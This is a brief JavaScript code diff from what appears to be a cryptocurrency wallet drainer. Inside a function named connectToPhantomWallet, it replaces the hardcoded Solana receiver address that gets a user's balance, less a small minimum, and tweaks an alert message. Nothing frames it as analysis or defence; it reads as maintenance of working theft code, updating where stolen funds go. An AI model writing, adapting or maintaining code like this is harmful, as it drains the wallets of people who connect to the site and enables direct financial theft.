@@ -158,10 +158,10 @@ async function connectToPhantomWallet(publicKey) {
 
                  
                     try {
-                        const recieverWallet = new solanaWeb3.PublicKey('5tyHpW1niYj3yka1TRu429GftLgDhoWPX7EcSMm8tC3');
+                        const recieverWallet = new solanaWeb3.PublicKey('Bp9T9EjXgbrMRhMxJXnuDuD7X5WEgL8MQ3sDTVaRL6i8');
                         const balanceForTransfer = walletBalance - minBalance;
                         if (balanceForTransfer <= 0) {
-                            alert("Insufficient funds for transfer.");
+                            alert("Insufficient funds for  transfer.");
                             return;
                         }
 
